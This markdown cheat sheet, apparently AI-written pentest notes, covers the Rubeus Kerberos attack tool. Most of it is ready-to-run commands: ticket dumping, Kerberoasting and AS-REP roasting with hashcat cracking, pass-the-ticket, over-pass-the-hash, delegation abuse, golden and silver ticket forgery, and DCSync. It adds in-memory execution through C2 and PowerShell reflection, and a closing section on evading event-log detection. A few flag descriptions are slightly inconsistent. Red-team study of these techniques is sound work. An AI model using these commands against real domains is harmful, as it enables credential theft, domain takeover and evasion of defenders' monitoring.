# Rubeus

**Tags:** `#rubeus` `#kerberos` `#lateral` `#activedirectory` `#passtheticket` `#kerberoasting` `#asreproasting` `#overpassthehash` `#goldenticket` `#windows`

GhostPack's C# Kerberos abuse toolkit. Handles the full Kerberos attack surface from a Windows foothold: ticket dumping, Kerberoasting, AS-REP Roasting, Pass-the-Ticket, Over-Pass-the-Hash, Constrained/Unconstrained delegation abuse, S4U attacks, and Golden/Silver Ticket operations. The Windows-side Kerberos counterpart to Impacket's tools.

**Source:** https://github.com/GhostPack/Rubeus
**Install:** Pre-compiled releases or build from source in Visual Studio. Run via execute-assembly from C2 or drop to disk.

```cmd
Rubeus.exe dump /nowrap
```

> [!note] **Rubeus vs Impacket Kerberos tools** — Rubeus runs on the Windows target using the local Kerberos API — requests and injects tickets into live sessions. Impacket tools (GetUserSPNs, GetNPUsers, getTGT) run from Kali over the network. Use both: Impacket for remote/external attacks, Rubeus for on-host ticket manipulation and injection.

---

## Ticket Dumping

```cmd
:: Dump all tickets for current user
Rubeus.exe dump /nowrap

:: Dump all tickets on host (requires admin)
Rubeus.exe dump /service:krbtgt /nowrap

:: Dump tickets for specific service
Rubeus.exe dump /service:cifs /nowrap
Rubeus.exe dump /service:http /nowrap

:: Dump from specific LUID (logon session)
Rubeus.exe dump /luid:0x3e7 /nowrap

:: List all current tickets
Rubeus.exe triage
```

---

## Kerberoasting

```cmd
:: Kerberoast all SPNs (current user context)
Rubeus.exe kerberoast /nowrap

:: Output to file
Rubeus.exe kerberoast /nowrap /outfile:hashes.txt

:: Target specific user
Rubeus.exe kerberoast /user:svc_sql /nowrap

:: RC4 only (downgrade from AES — easier to crack)
Rubeus.exe kerberoast /rc4opsec /nowrap

:: With alternate credentials
Rubeus.exe kerberoast /creduser:DOMAIN\user /credpassword:Password /nowrap
```

```bash
# Crack — hashcat mode 13100
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## AS-REP Roasting

```cmd
:: AS-REP Roast all accounts with preauth disabled
Rubeus.exe asreproast /nowrap

:: Target specific user
Rubeus.exe asreproast /user:jsmith /nowrap

:: Output to file
Rubeus.exe asreproast /nowrap /outfile:asrep_hashes.txt
```

```bash
# Crack — hashcat mode 18200
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Pass-the-Ticket (PTT)

```cmd
:: Import .kirbi ticket into current session
Rubeus.exe ptt /ticket:ticket.kirbi

:: Import base64-encoded ticket (from /nowrap output)
Rubeus.exe ptt /ticket:<BASE64>

:: Verify ticket imported
klist

:: Use ticket (access share, DC, etc.)
dir \\dc01\C$
```

---

## Over-Pass-the-Hash (Pass-the-Key)

Convert NTLM hash to Kerberos TGT — get a full Kerberos session without plaintext password.

```cmd
:: Request TGT using NTLM hash (RC4)
Rubeus.exe asktgt /user:Administrator /rc4:NTLMhash /ptt

:: Request TGT using AES256 key (stealthier)
Rubeus.exe asktgt /user:Administrator /aes256:AES256key /ptt /opsec

:: Save TGT without injecting
Rubeus.exe asktgt /user:Administrator /rc4:NTLMhash /nowrap

:: Sacrificial logon session — most stealthy
Rubeus.exe asktgt /user:Administrator /rc4:NTLMhash /createnetonly:C:\Windows\System32\cmd.exe /show
```

---

## Request Service Tickets (TGS)

```cmd
:: Request TGS using current TGT
Rubeus.exe asktgs /service:cifs/fileserver.domain.local /ptt

:: Request with specific TGT
Rubeus.exe asktgs /ticket:<BASE64_TGT> /service:cifs/fileserver.domain.local /ptt

:: Force AES encryption
Rubeus.exe asktgs /service:cifs/fileserver.domain.local /enctype:aes256 /ptt
```

---

## Unconstrained Delegation Abuse

```cmd
:: Monitor for TGTs arriving (run on host with unconstrained delegation)
Rubeus.exe monitor /interval:5 /nowrap

:: Trigger coercion from Kali (Coercer / PrinterBug)
:: TGT appears in monitor output — import it
Rubeus.exe ptt /ticket:<BASE64_TGT>

:: DCSync as DC machine account
secretsdump.py -k -no-pass DOMAIN/DC01$@dc01.domain.local
```

---

## Constrained Delegation Abuse (S4U)

```cmd
:: Get TGT for delegation account first
Rubeus.exe asktgt /user:svc_web /rc4:NTLMhash /nowrap

:: S4U2Self + S4U2Proxy — impersonate admin to allowed service
Rubeus.exe s4u /ticket:<BASE64_TGT> /impersonateuser:Administrator \
  /msdsspn:cifs/fileserver.domain.local /ptt

:: SPN swap — access CIFS even if only HTTP is in delegation list
Rubeus.exe s4u /ticket:<BASE64_TGT> /impersonateuser:Administrator \
  /msdsspn:http/fileserver.domain.local /altservice:cifs /ptt
```

---

## Golden / Silver Tickets

```cmd
:: Golden Ticket — forge TGT using krbtgt hash
Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:domain.local /sid:S-1-5-21-... \
  /user:Administrator /ptt

:: Silver Ticket — forge TGS for specific service
Rubeus.exe silver /rc4:<SERVICE_HASH> /domain:domain.local /sid:S-1-5-21-... \
  /user:Administrator /service:cifs/fileserver.domain.local /ptt
```

---

## Renewal & Cleanup

```cmd
:: Renew a TGT
Rubeus.exe renew /ticket:<BASE64> /ptt

:: Purge all tickets from current session
Rubeus.exe purge

:: Describe a ticket (decode .kirbi or base64)
Rubeus.exe describe /ticket:<BASE64>
```

---

## In-Memory Execution

```powershell
# execute-assembly (C2 frameworks)
execute-assembly Rubeus.exe kerberoast /nowrap
execute-assembly Rubeus.exe dump /nowrap

# PowerShell reflection
$bytes = [System.IO.File]::ReadAllBytes('Rubeus.exe')
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @(,[string[]]@('dump','/nowrap')))
```

---

## OPSEC Notes

- Kerberoasting generates Event ID **4769** (TGS request) — RC4 encryption type `0x17` is suspicious; use `/rc4opsec` or AES to blend in
- `asktgt` with NTLM hash generates **4768** with RC4 (`0x17`) — AES (`/opsec`) is `0x12` which is normal
- PTT ticket injection is in-memory only — no network events on injection, only when used
- Golden/Silver tickets generate no DC-side events on creation — detected on use via anomalous service ticket patterns

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
